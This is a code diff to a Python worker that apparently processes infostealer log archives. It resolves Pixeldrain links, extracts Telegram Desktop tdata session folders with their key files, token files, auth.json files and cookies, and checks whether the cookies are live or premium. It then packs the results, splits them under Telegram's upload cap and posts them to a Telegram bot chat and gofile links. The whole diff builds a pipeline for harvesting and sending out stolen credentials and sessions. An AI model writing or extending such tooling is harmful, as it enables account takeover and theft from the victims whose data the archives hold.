@@ -360,6 +360,72 @@ def scan_chunk(paths):
     return [scan_file(p) for p in paths]
 
 # ── 1. download ──
+PD_HOSTS   = ("pixeldrain.com", "pixeldrain.net", "pixeldra.in", "pixeldrain.nl",
+              "pixeldrain.biz", "pixeldrain.tech", "pixeldrain.dev")
+PD_PROXIES = ("pd.cybar.xyz", "pd.1drv.eu.org")      # mirrors, they take bare /<id>
+PD_ID      = re.compile(r"[A-Za-z0-9_-]{4,20}\Z")
+PD_ARC     = re.compile(r"\.(zip|rar|7z|tar|gz|tgz)\Z", re.I)
+PD_HDRS    = {"User-Agent": "Mozilla/5.0"}
+
+def pd_host(url):
+    m = re.search(r"https?://([^/\s?#]+)", url)
+    return m.group(1).lower() if m else ""
+
+def pd_parts(url, host):
+    """('file' | 'list', id, item, err) — err only when the link is Pixeldrain but
+    names nothing we can pull (so aria2c never streams an HTML page)."""
+    segs = [s for s in url.split("://", 1)[1][len(host):].split("#")[0]
+            .split("?")[0].split("/") if s]
+    im = re.search(r"item=(\d+)", url.split("#", 1)[1] if "#" in url else "")
+    item = int(im.group(1)) if im else None
+    if len(segs) > 2 and segs[0] == "api" and segs[1] in ("file", "list"):
+        return ("list" if segs[1] == "list" else "file"), segs[2], item, None
+    if len(segs) > 1 and segs[0] in ("u", "f", "l") and PD_ID.match(segs[1]):
+        return ("list" if segs[0] == "l" else "file"), segs[1], item, None
+    if len(segs) == 1 and host in PD_PROXIES and PD_ID.match(segs[0]):
+        return "file", segs[0], item, None
+    if segs[:1] == ["d"]:
+        return None, None, None, "pixeldrain folder (/d/) link — send one /u/ archive link"
+    return None, None, None, "no file id in that pixeldrain link (…/u/XXXXXXXX)"
+
+def resolve(url):
+    """(direct URL, filename, size, err). Pixeldrain share pages are HTML, so
+    /u/ and /l/ links become the real API download URL; every other link is
+    handed to aria2c untouched. /info matters — plain /api/file/<id> IS the file."""
+    host = pd_host(url)
+    if host not in PD_HOSTS + PD_PROXIES:
+        return url, None, 0, None
+    kind, pid, item, err = pd_parts(url, host)
+    if err:
+        return None, None, 0, err
+    api = "https://%s/api/" % ("pixeldrain.com" if host in PD_PROXIES else host)
+    try:
+        body = requests.get((api + "list/" + pid) if kind == "list"
+                            else (api + "file/" + pid + "/info"),
+                            timeout=30, headers=PD_HDRS).json()
+    except Exception as e:
+        return None, None, 0, "pixeldrain lookup failed: %s" % str(e)[:90]
+    if not body.get("success", True):
+        return None, None, 0, "pixeldrain: %s" % (body.get("message") or
+                                                  body.get("value") or "link not found")
+    files = [f for f in (body.get("files") if kind == "list" else [body])
+             if isinstance(f, dict) and f.get("name")]
+    if not files:
+        return None, None, 0, "pixeldrain: nothing behind that link (deleted, private or empty)"
+    if item is not None and item < len(files):
+        files = [files[item]]
+    if len(files) > 1:
+        files = [f for f in files if PD_ARC.search(f["name"])]
+        if not files:
+            return None, None, 0, "pixeldrain folder holds no .zip/.rar/.7z archive"
+    pick = max(files, key=lambda f: f.get("size") or 0)
+    avail = (pick.get("availability") or "").strip()
+    if avail:
+        return None, None, 0, "pixeldrain: %s" % (pick.get("availability_message") or avail)
+    return (api + "file/%s?download" % (pick.get("id") or pid),
+            re.sub(r'[\\/:*?"<>|]+', "_", pick["name"])[:100],
+            int(pick.get("size") or 0), None)
+
 def download(url):
     dest = WORK / "dl"; dest.mkdir(parents=True, exist_ok=True)
     _state["err"] = None
@@ -372,6 +438,14 @@ def download(url):
                        size=fs(os.path.getsize(cand)),
                        msg="same link — reusing the archive already on this VM")
                     return Path(cand)
+    src, fname, fsize, err = resolve(url)
+    if err:
+        _state["err"] = err
+        st("error", err=err); return None
+    if src != url:
+        st("download", 4, msg="pixeldrain link resolved → %s (%s)"
+           % (fname or "?", fs(fsize) if fsize else "?"))
+        url = src
     if not shutil.which("aria2c"):
         st("installing", 3); apt(["aria2", "p7zip-full", "unrar-free"])
     use_aria = shutil.which("aria2c") is not None
@@ -382,7 +456,10 @@ def download(url):
         cmd = [ "aria2c", "--dir", str(dest), "--split=16", "--max-connection-per-server=16",
                 "--min-split-size=1M", "--file-allocation=none", "--auto-file-renaming=false",
                 "--allow-overwrite=true", "--console-log-level=warn", "--summary-interval=1",
-                "--user-agent=Mozilla/5.0", url ]
+                "--user-agent=Mozilla/5.0" ]
+        if fname:
+            cmd += ["--out", fname]
+        cmd.append(url)
         pr = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               text=True, errors="ignore", bufsize=1)
         pe = re.compile(r"\[#\w+\s+([\d.]+\w+)/([\d.]+\w+)\((\d+)%\)")
@@ -408,7 +485,7 @@ def download(url):
                (pr.returncode, " ".join(tail[-3:])[:150]))
             return None
     else:
-        found = slow_dl(url, dest, t0)
+        found = slow_dl(url, dest, t0, fname)
         if found is None:
             st("error", err=_state.get("err") or "download_failed"); return None
     if not found or not os.path.isfile(found):
@@ -428,10 +505,10 @@ def download(url):
        dl_time=ft(time.time() - t0))
     return Path(found)
 
-def slow_dl(url, dest, t0):
+def slow_dl(url, dest, t0, name=None):
     import requests
     from urllib.parse import unquote
-    nm = unquote(url.split("?")[0].rstrip("/").split("/")[-1])
+    nm = name or unquote(url.split("?")[0].rstrip("/").split("/")[-1])
     if not re.search(r"\.(zip|rar|7z)$", nm, re.I): nm = "archive.zip"
     tgt = dest / nm
     with requests.get(url, stream=True, timeout=900,
@@ -702,6 +779,72 @@ def gofile(path):
 
 SPECS = {}
 Q = queue.Queue()
+TG_CAP = 45 << 20          # stays clear of Telegram's 50 MB bot upload limit
+
+def split_zip(zp):
+    """Roll an oversized zip into <name>.partN.zip files, each a valid archive on
+    its own. Entries are copied whole (STORED — re-deflating an already packed
+    inner zip buys nothing and burns a core), and found_in.txt is repeated in
+    every part so no part loses its manifest."""
+    idx, raw, cur = 0, 0, None
+    with zipfile.ZipFile(zp) as src:
+        infos = [i for i in src.infolist() if not i.is_dir()]
+        man = next((i for i in infos if i.filename.lower() == "found_in.txt"), None)
+        blob_man = src.read(man) if man else None
+        for inf in infos:
+            if inf is man:
+                continue
+            blob = src.read(inf)
+            if cur is not None and raw + len(blob) > TG_CAP:
+                cur.close(); cur = None
+            if cur is None:
+                idx += 1
+                cur = zipfile.ZipFile(OUT / ("%s.part%d.zip" % (zp.stem, idx)),
+                                      "w", zipfile.ZIP_STORED)
+                raw = 0
+                if blob_man is not None:
+                    cur.writestr(man.filename, blob_man)
+            cur.writestr(inf, blob, zipfile.ZIP_STORED)
+            raw += len(blob)
+            if raw > TG_CAP:                 # one entry alone breaks the cap
+                sys.stdout.write("part %d holds a %s entry that is too big for "
+                                 "Telegram on its own\n" % (idx, fs(raw)))
+                sys.stdout.flush()
+        if cur is not None:
+            cur.close()
+    return [p for p in (OUT / ("%s.part%d.zip" % (zp.stem, i)) for i in range(1, idx + 1))
+            if p.exists() and p.stat().st_size > 0]
+
+def ship(zp, cap):
+    """Send one result zip. Telegram-sized files go whole; anything bigger is
+    split into parts and the complete archive is handed over as a gofile link —
+    nobody wants to re-join parts by hand. cap(size, idx, count, total, split)
+    builds the caption. Returns (parts sent, full-zip link or None)."""
+    tot = zp.stat().st_size if zp.exists() else 0
+    if not tot:
+        return 0, None
+    if tot <= TG_CAP:
+        return (1 if upload(str(zp), cap(tot, 1, 1, tot, False)) else 0), None
+    parts = split_zip(zp)
+    sent = sum(1 for i, p in enumerate(parts, 1)
+               if upload(str(p), cap(p.stat().st_size, i, len(parts), tot, True)))
+    if not sent:
+        return 0, None
+    url = gofile(str(zp))
+    if not url:
+        sys.stdout.write("gofile link for %s failed\n" % zp.name); sys.stdout.flush()
+    for p in parts:
+        try: p.unlink()
+        except Exception: pass
+    return sent, url
+
+def ship_note(idx, count, size, tot, split, label):
+    """Shared size / part line for every shipped archive."""
+    if split:
+        return (f"📦 {bold('Part')}    {code(idx)} / {code(count)}\n"
+                f"✂️ {bold('Split')}   {code(fs(tot))} broke Telegram's 50 MB cap — "
+                f"the whole {code(label)} rides on the link below\n")
+    return f"📦 {bold('Size')}   {code(fs(size))}\n"
 
 def deliver(packed, task):
     """Post every domain zip (and each part of a split domain) to the chat.
@@ -747,13 +890,22 @@ def deliver_auth(auths):
     if zp is None:
         return False, None
     shown = "\n".join(code("%s ← %s" % (n, r[:58])) for n, r in rels[:10])
+    size_line = f"📦 {bold('Size')}   {code(fmt_size(zp.stat().st_size))}\n"
     cap = (f"{gold_header('AUTH.JSON FILES', esc(str(len(auths)) + ' found'))}\n{THIN}\n"
-           f"📦 {bold('Size')}   {code(fmt_size(zp.stat().st_size))}\n"
-           f"🗂 {bold('Names')}  1st_auth.json, 2nd_auth.json …\n"
+           + size_line
+           + f"🗂 {bold('Names')}  1st_auth.json, 2nd_auth.json …\n"
            + shown
            + ("\n…" if len(rels) > 10 else ""))
     if not TG or not CHAT:
         return False, None
+    if zp.stat().st_size > TG_CAP:
+        def auth_cap(size, idx, count, tot, split):
+            return (cap.replace(size_line, "") + "\n"
+                    + ship_note(idx, count, size, tot, split, "auth.zip")
+                    + f"🔎 {bold('Re-check')}  parts cannot be re-downloaded as one "
+                      f"archive, so the bot-side proxy check is skipped for this job")
+        sent_parts, _ = ship(zp, auth_cap)
+        return sent_parts > 0, None
     try:
         with open(zp, "rb") as fh:
             r = requests.post(TG_API + "sendDocument",
@@ -1133,6 +1285,61 @@ def pack_tdata(dirs):
                      ("=" * 48, "\n".join(manifest)))
     return zp, total
 
+TOKEN_NAMES = ("tokens.txt", "token.txt")
+
+def find_tokens(roots):
+    """Every tokens.txt / token.txt in the extracted trees — Telegram Desktop
+    clients drop these next to (or beside) the tdata folders."""
+    out = []
+    for root in roots:
+        try:
+            if not root.exists():
+                continue
+            for p in root.rglob("*"):
+                try:
+                    if p.is_file() and p.name.lower() in TOKEN_NAMES:
+                        out.append(p)
+                except OSError:
+                    continue
+        except OSError:
+            continue
+    return out
+
+def pack_tokens(files):
+    """tokens.zip: each file becomes <the folder it was found in>_file_token.txt,
+    duplicates get _2/_3, and found_in.txt maps every name back to its origin
+    path inside the archive."""
+    if not files:
+        return None, 0
+    zp = OUT / "tokens.zip"
+    manifest, used, total = [], {""}, 0
+    base = WORK / "ex"
+    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
+        for p in files:
+            folder = re.sub(r"[^\w.-]", "_", p.parent.name) or "root"
+            name, k = "%s_file_token.txt" % folder, 2
+            while name.lower() in used:
+                name = "%s_file_token_%d.txt" % (folder, k)
+                k += 1
+            used.add(name.lower())
+            try:
+                z.write(str(p), name)
+            except Exception:
+                continue
+            try:
+                rel = str(p.relative_to(base))
+            except Exception:
+                rel = str(p)
+            manifest.append("%s  <-  %s" % (name, rel))
+            total += 1
+        if not total:
+            zp.unlink(missing_ok=True)
+            return None, 0
+        z.writestr("found_in.txt",
+                   "TOKEN FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
+                   ("=" * 48, "\n".join(manifest)))
+    return zp, total
+
 def finish(task, stage, **extra):
     """Terminal state for a job: paint the card, report to the bot, back to idle."""
     st(stage, 100 if stage == "done" else _state.get("pct", 0),
@@ -1142,7 +1349,8 @@ def finish(task, stage, **extra):
     payload.update({k: extra[k] for k in extra
                     if k in ("err", "found", "cookies", "tried", "sent", "failed",
                              "links", "auth", "auth_sent", "auth_fid", "td_total",
-                             "td_sent", "ck_total", "ck_live", "ck_prem", "ck_free",
+                             "td_parts", "tok_total", "tok_parts",
+                             "ck_total", "ck_live", "ck_prem", "ck_free",
                              "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies")})
     payload["pubs"] = PB[3]
     report(payload)
@@ -1210,23 +1418,43 @@ def process(task):
         if not tdirs:
             tdirs = find_tdata(WORK / "ex")   # final sweep, signature rules too
         td_zip, td_total = pack_tdata(tdirs)
-    td_sent = False
+    td_parts, td_link = 0, None
     if td_zip:
-        cap = (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
-               % (td_total, '' if td_total == 1 else 's')))}\n{THIN}\n"
-               f"🗃 {bold('Folders')}  {code(td_total)}\n"
-               f"🗂 {bold('Layout')}  one tdata.zip · every inner zip keeps the "
-               f"folder's exact name (tdata.zip, tdata1.zip…)\n"
-               f"🗝 {bold('Manifest')}  found_in.txt shows each origin path\n"
-               f"📎 Sessions, map0/map1 and key files all included.")
-        td_sent = upload(str(td_zip), cap)
+        def td_cap(size, idx, count, tot, split):
+            return (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
+                       % (td_total, '' if td_total == 1 else 's')))}\n{THIN}\n"
+                    f"🗃 {bold('Folders')}  {code(td_total)}\n"
+                    + ship_note(idx, count, size, tot, split, "tdata.zip") +
+                    f"🗂 {bold('Layout')}  every inner zip keeps the folder's exact "
+                    f"name (tdata.zip, tdata1.zip…)\n"
+                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path\n"
+                    f"📎 Sessions, map0/map1 and key files all included.")
+        td_parts, td_link = ship(td_zip, td_cap)
+        if td_link:
+            links["tdata"] = td_link
+    tok_zip, tok_total = None, 0
+    toks = find_tokens([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
+    if toks:
+        tok_zip, tok_total = pack_tokens(toks)
+    tok_parts, tok_link = 0, None
+    if tok_zip:
+        def tok_cap(size, idx, count, tot, split):
+            return (f"{gold_header('TOKEN FILES', esc('%d found' % tok_total))}\n{THIN}\n"
+                    f"🎟 {bold('Files')}    {code(tok_total)} × {code('tokens.txt')}\n"
+                    f"🏷 {bold('Names')}    {code('<folder it came from>_file_token.txt')}\n"
+                    + ship_note(idx, count, size, tot, split, "tokens.zip") +
+                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
+        tok_parts, tok_link = ship(tok_zip, tok_cap)
+        if tok_link:
+            links["tokens"] = tok_link
     ck = check_auths(auths) if (want_auth and task.get("authcheck") and auths) else {}
     shutil.rmtree(WORK, ignore_errors=True)
     st("done", 100, job=task.get("job"), vm=SPECS)
     finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
            failed=failed, links=links, auth=len(auths) if want_auth else 0,
            auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None,
-           td_total=td_total, td_sent=td_sent, **ck)
+           td_total=td_total, td_parts=td_parts,
+           tok_total=tok_total, tok_parts=tok_parts, **ck)
 
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
